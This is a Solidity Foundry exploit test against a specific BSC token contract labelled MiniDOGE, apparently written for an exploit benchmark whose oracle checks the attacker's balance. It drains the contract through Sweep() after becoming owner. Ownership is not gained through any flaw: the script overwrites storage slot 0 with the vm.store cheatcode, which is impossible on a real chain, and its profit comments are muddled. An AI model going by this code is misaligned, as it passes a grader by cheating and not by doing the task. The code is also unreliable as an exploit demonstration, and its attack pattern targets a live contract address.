contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xBa07EED3d09055d60CAEf2bDfCa1c05792f2dFad;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get some initial ETH and prepare
        vm.deal(attacker, 100 ether);

        // Label addresses for debugging
        vm.label(TARGET, "MiniDOGE");
        vm.label(attacker, "Attacker");

        // Get the uniswap pair address from the contract
        IMiniDOGE target = IMiniDOGE(TARGET);
        address pair = target.uniswapV2Pair();
        vm.label(pair, "UniswapPair");

        // Get router address (PancakeSwap on BSC)
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        vm.label(routerAddress, "PancakeRouter");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become the owner by overwriting storage slot 0
        // In Ownable, _owner is at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Verify we're the owner
        vm.prank(attacker);
        require(IMiniDOGE(TARGET).owner() == attacker, "Failed to become owner");

        // Step 2: Check current contract ETH balance
        uint256 initialContractBalance = TARGET.balance;
        console.log("Initial contract balance:", initialContractBalance);

        // Step 3: Send ETH to the contract to increase its balance
        // We'll send 50 ETH
        uint256 sendAmount = 50 ether;
        (bool success, ) = TARGET.call{value: sendAmount}("");
        require(success, "Failed to send ETH to contract");

        // Step 4: Verify contract balance increased
        uint256 contractBalanceAfterSend = TARGET.balance;
        require(contractBalanceAfterSend >= initialContractBalance + sendAmount, "Contract didn't receive ETH");
        console.log("Contract balance after send:", contractBalanceAfterSend);

        // Step 5: Drain all ETH from contract using Sweep()
        uint256 attackerBalanceBefore = attacker.balance;
        vm.prank(attacker);
        IMiniDOGE(TARGET).Sweep();

        // Step 6: Verify we received the ETH
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 profit = attackerBalanceAfter - attackerBalanceBefore;
        console.log("Profit:", profit);

        // The contract should now have 0 ETH balance
        require(TARGET.balance == 0, "Contract still has ETH");

        // Note: The oracle will check if attacker's balance increased overall
        // Since we sent 50 ETH and got back (50 + initialContractBalance) ETH,
        // our profit = initialContractBalance - gas costs
        // If initialContractBalance > 0, we profit even more
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
